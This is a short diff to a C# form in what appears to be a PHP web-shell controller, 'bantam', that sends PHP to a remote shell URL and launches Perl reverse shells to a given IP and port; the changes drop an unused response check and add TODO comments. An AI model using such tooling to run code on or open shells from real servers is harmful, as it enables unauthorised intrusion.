@@ -205,11 +205,7 @@ namespace bantam.Forms
         /// <param name="phpCode"></param>
         private async void PopChankroShell(string phpCode)
         {
-            ResponseObject response = await Task.Run(() => WebHelper.ExecuteRemotePHP(ShellUrl, phpCode));
-
-            if (string.IsNullOrEmpty(response.Result) == false) {
-                string result = response.Result;
-            }
+            await Task.Run(() => WebHelper.ExecuteRemotePHP(ShellUrl, phpCode));
         }
 
         /// <summary>
@@ -222,6 +218,7 @@ namespace bantam.Forms
             string shellCode = string.Empty;
             string ipv4 = Helper.MinifyCode(textBoxIP.Text);
 
+            //todo gui things, ipv4 & port validation
             if (string.IsNullOrEmpty(ipv4)) {
                 return;
             }
@@ -258,6 +255,7 @@ namespace bantam.Forms
                         return;
                     }
 
+                    //todo would be cool to detect if the shell pop'd and stop further shell poping attempts
                     shellCode = PerlShell(ipv4, port);
                     PopReverseShell(shellCode);
 
